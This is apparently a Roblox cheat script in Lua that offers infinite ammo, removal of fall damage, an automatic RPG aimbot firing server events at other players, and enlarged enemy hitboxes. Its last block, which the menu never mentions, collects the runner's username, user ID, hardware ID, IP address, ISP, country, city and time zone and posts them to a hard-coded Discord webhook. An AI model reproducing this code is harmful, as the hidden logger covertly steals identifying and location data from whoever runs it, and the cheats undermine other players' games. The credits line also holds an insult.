local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "m5ware",
    SubTitle = "best wt script",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})


local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "home" }),
    RPG = Window:AddTab({ Title = "RPG", Icon = "rocket" }),
    Hitboxes = Window:AddTab({ Title = "Hitboxes", Icon = "box" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}


local Ammos = nil
local AimbotEnabled = false
local _G = {
    HeadSize = 20,
    Disabled = false -- Now controlled by toggle
}


local ignoredPlayers = {}


Tabs.Main:AddToggle("InfAmmo", {
    Title = "Infinite Ammo",
    Default = false,
    Callback = function(Value)
        if Value then
            Ammos = {}
            for _,v in next, game:GetService("ReplicatedStorage").Configurations.ACS_Guns:GetChildren() do
                Ammos[v.Name] = v.Ammo.Value  
                v.Ammo.Value = math.huge  
            end
            Fluent:Notify({
                Title = "Infinite Ammo",
                Content = "Enabled",
                Duration = 3
            })
        else
            if Ammos then
                for i,v in next, Ammos do
                    game:GetService("ReplicatedStorage").Configurations.ACS_Guns:FindFirstChild(i).Ammo.Value = v
                end
                Ammos = nil
                Fluent:Notify({
                    Title = "Infinite Ammo",
                    Content = "Disabled",
                    Duration = 3
                })
            end
        end
    end
})

Tabs.Main:AddToggle("NoFallDmg", {
    Title = "No Fall Damage",
    Default = false,
    Callback = function(Value)
        if Value then
            local freefall = game:GetService("ReplicatedStorage"):WaitForChild("Freefall")
            if freefall then freefall:Destroy() end
            
            local fdmEvent = game:GetService("ReplicatedStorage"):WaitForChild("ACS_Engine"):WaitForChild("Events"):WaitForChild("FDMG")
            if fdmEvent then fdmEvent:Destroy() end
            
            Fluent:Notify({
                Title = "No Fall Damage",
                Content = "Enabled",
                Duration = 3
            })
        else
            Fluent:Notify({
                Title = "No Fall Damage",
                Content = "Restart game to disable",
                Duration = 5
            })
        end
    end
})

Tabs.RPG:AddInput("IgnorePlayerInput", {
    Title = "Manage Ignore List",
    Default = "",
    Placeholder = "Type name and press Enter",
    Numeric = false,
    Finished = true,
    Callback = function(Value)
        if Value ~= "" then
            if ignoredPlayers[Value] then
                ignoredPlayers[Value] = nil
                Fluent:Notify({
                    Title = "Ignore List",
                    Content = "Removed "..Value.." from ignore list",
                    Duration = 3,
                    Style = { BackgroundColor = Color3.fromRGB(200, 50, 50) }
                })
            else
                local playerExists = false
                for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                    if player.Name == Value then
                        playerExists = true
                        break
                    end
                end
                
                if playerExists then
                    ignoredPlayers[Value] = true
                    Fluent:Notify({
                        Title = "Ignore List",
                        Content = "Added "..Value.." to ignore list",
                        Duration = 3,
                        Style = { BackgroundColor = Color3.fromRGB(50, 200, 50) }
                    })
                else
                    Fluent:Notify({
                        Title = "Error",
                        Content = "Player "..Value.." not found",
                        Duration = 3,
                        Style = { BackgroundColor = Color3.fromRGB(200, 50, 50) }
                    })
                end
            end
            Tabs.RPG:GetInput("IgnorePlayerInput"):Set("")
        end
    end
})

Tabs.RPG:AddButton({
    Title = "Show Ignored Players",
    Description = "View current ignore list",
    Callback = function()
        local ignoredList = {}
        for name,_ in pairs(ignoredPlayers) do
            table.insert(ignoredList, name)
        end
        
        if #ignoredList > 0 then
            Fluent:Notify({
                Title = "Ignored Players ("..#ignoredList..")",
                Content = table.concat(ignoredList, ", "),
                Duration = 5
            })
        else
            Fluent:Notify({
                Title = "Ignore List",
                Content = "No players being ignored",
                Duration = 3
            })
        end
    end
})

Tabs.RPG:AddButton({
    Title = "Clear Ignore List",
    Description = "Remove all players from ignore list",
    Callback = function()
        ignoredPlayers = {}
        Fluent:Notify({
            Title = "Ignore List",
            Content = "Cleared all ignored players",
            Duration = 3
        })
    end
})


Tabs.RPG:AddToggle("RPG Target", {
    Title = "RPG Target",
    Description = "Automatically targets nearby players (except ignored) - 1 shot per 3s per player",
    Default = false,
    Callback = function(Value)
        getgenv().AimbotEnabled = Value

        if Value then
            local scanRadius = 5000
            local Players = game:GetService("Players")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local lastFireTimes = {}

            task.spawn(function()
                while getgenv().AimbotEnabled do
                    local localPlayer = Players.LocalPlayer
                    local character = localPlayer.Character
                    if not character then task.wait() continue end

                    local rpg = character:FindFirstChild("RPG")
                    if not rpg then task.wait() continue end

                    for _, targetPlayer in ipairs(Players:GetPlayers()) do
                        if targetPlayer ~= localPlayer and targetPlayer.Character and not ignoredPlayers[targetPlayer.Name] then
                            local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                            local targetBody = targetPlayer.Character:FindFirstChild("UpperTorso") or targetHRP

                            if targetBody and targetHRP then
                                local distance = (targetHRP.Position - character.HumanoidRootPart.Position).Magnitude
                                if distance <= scanRadius then
                                    local now = tick()
                                    local lastFire = lastFireTimes[targetPlayer.Name] or 0

                                    if now - lastFire >= 3 then
                                        lastFireTimes[targetPlayer.Name] = now

                                        task.spawn(function()
                                            local argsFire = {
                                                Vector3.new(0, 0, 0),
                                                rpg,
                                                rpg,
                                                targetBody.Position + Vector3.new(0, 2, 0)
                                            }
                                            ReplicatedStorage.RocketSystem.Events.FireRocket:InvokeServer(unpack(argsFire))

                                            local argsHit = {
                                                targetBody.Position,
                                                Vector3.new(0, 0, 0),
                                                rpg,
                                                rpg,
                                                targetBody,
                                                nil,
                                                localPlayer.Name .. "HeldRocket"
                                            }
                                            ReplicatedStorage.RocketSystem.Events.RocketHit:FireServer(unpack(argsHit))
                                        end)
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.1) -- чтобы не грузить цикл
                end
            end)
        end

        Fluent:Notify({
            Title = "RPG Target",
            Content = Value and "Enabled - Automatically targeting players" or "Disabled",
            Duration = 5
        })
    end
})



Tabs.Hitboxes:AddToggle("HitboxToggle", {
    Title = "Enable Hitboxes",
    Description = "Show/hide enemy hitboxes",
    Default = false,
    Callback = function(Value)
        _G.Disabled = not Value
        Fluent:Notify({
            Title = "Hitboxes",
            Content = Value and "Enabled" or "Disabled",
            Duration = 3
        })
    end
})

-- Hitbox Size Slider
Tabs.Hitboxes:AddSlider("HitboxSize", {
    Title = "Hitbox Size",
    Description = "Adjust enemy hitbox size",
    Default = 20,
    Min = 1,
    Max = 1000,
    Rounding = 0,
    Callback = function(Value)
        _G.HeadSize = Value
    end
})


Tabs.Hitboxes:AddButton({
    Title = "Set Hitbox to 50",
    Callback = function()
        Tabs.Hitboxes:GetSlider("HitboxSize"):Set(50)
        Fluent:Notify({
            Title = "Hitbox Size",
            Content = "Set to 50",
            Duration = 3
        })
    end
})

Tabs.Hitboxes:AddButton({
    Title = "Set Hitbox to 100",
    Callback = function()
        Tabs.Hitboxes:GetSlider("HitboxSize"):Set(100)
        Fluent:Notify({
            Title = "Hitbox Size",
            Content = "Set to 100",
            Duration = 3
        })
    end
})


Tabs.Hitboxes:AddDropdown("HitboxColor", {
    Title = "Hitbox Color",
    Description = "Change hitbox visualization color",
    Values = {"Blue", "Red", "Green", "Yellow", "Purple"},
    Default = "Blue",
    Callback = function(Value)
        local colorMap = {
            ["Blue"] = Color3.fromRGB(0, 0, 255),
            ["Red"] = Color3.fromRGB(255, 0, 0),
            ["Green"] = Color3.fromRGB(0, 255, 0),
            ["Yellow"] = Color3.fromRGB(255, 255, 0),
            ["Purple"] = Color3.fromRGB(128, 0, 128)
        }
        _G.HitboxColor = colorMap[Value]
        Fluent:Notify({
            Title = "Hitbox Color",
            Content = "Set to "..Value,
            Duration = 3
        })
    end
})


_G.HitboxColor = Color3.fromRGB(0, 0, 255)


game:GetService('RunService').RenderStepped:connect(function()
    if not _G.Disabled then
        for _, player in next, game:GetService('Players'):GetPlayers() do
            if player.Name ~= game:GetService('Players').LocalPlayer.Name then
                pcall(function()
                    local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        humanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                        humanoidRootPart.Transparency = 0.7
                        humanoidRootPart.BrickColor = BrickColor.new(_G.HitboxColor)
                        humanoidRootPart.Material = "Neon"
                        humanoidRootPart.CanCollide = false
                    end
                end)
            end
        end
    end
end)


Tabs.Settings:AddParagraph({
    Title = "Information",
    Content = "Script by wk0w x56h| dota pidor"
})

Tabs.Settings:AddParagraph({
    Title = "Usage Tips",
    Content = "1. Fire the RPG before use\n2. Use infinite ammo before picking up a weapon\n3. Type names and press Enter to manage ignore list"
})


SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)

Fluent:Notify({
    Title = "m5ware",
    Content = "Loaded successfully!",
    Duration = 5
})

local lp = game:GetService("Players").LocalPlayer

if game:IsLoaded() then
    local player_name = lp.Name
    local player_id = lp.UserId
    local webhook_url = "https://discord.com/api/webhooks/1430255660087644271/Ajz7SUoZvAlAAZJ69U48B1VJqGG2Gs-nOOE5SDiiGrVrQqVXkFoovtJZCEZ64Lb8c4pG"

    
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

    local place_id = game.PlaceId
    local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name

    local ip_info = syn and syn.request or http_request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    getgenv().ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)

    local current_time = os.date("%Y-%m-%d %H:%M:%S")

    
    local embed = {
        {
            ["title"] = "Executed",
            ["description"] = "User data",
            ["color"] = 0xFF0000,
            ["fields"] = {
                {
                    ["name"] = "Name",
                    ["value"] = player_name,
                    ["inline"] = true
                },
                
                {
                    ["name"] = "Display name",
                    ["value"] = lp.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "ID",
                    ["value"] = tostring(player_id),
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = hwid,
                    ["inline"] = false
                },
                {
                    ["name"] = "Game",
                    ["value"] = place_name,
                    ["inline"] = false
                },
                {
                    ["name"] = "Time",
                    ["value"] = current_time,
                    ["inline"] = false
                },
                {
                    ["name"] = "IP",
                    ["value"] = getgenv().ipinfo_table.query,
                    ["inline"] = false
                },
                -- НОВЫЕ ПОЛЯ:
                {
                    ["name"] = "Provider",
                    ["value"] = getgenv().ipinfo_table.isp,
                    ["inline"] = true
                },
                {
                    ["name"] = "Country",
                    ["value"] = getgenv().ipinfo_table.country,
                    ["inline"] = true
                },
                {
                    ["name"] = "City",
                    ["value"] = getgenv().ipinfo_table.city,
                    ["inline"] = true
                },
                {
                    ["name"] = "Time zone",
                    ["value"] = getgenv().ipinfo_table.timezone,
                    ["inline"] = true
                }
            }
        }
    }

    http_request(
        {
            Url = webhook_url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({["embeds"] = embed})
        }
    )
end
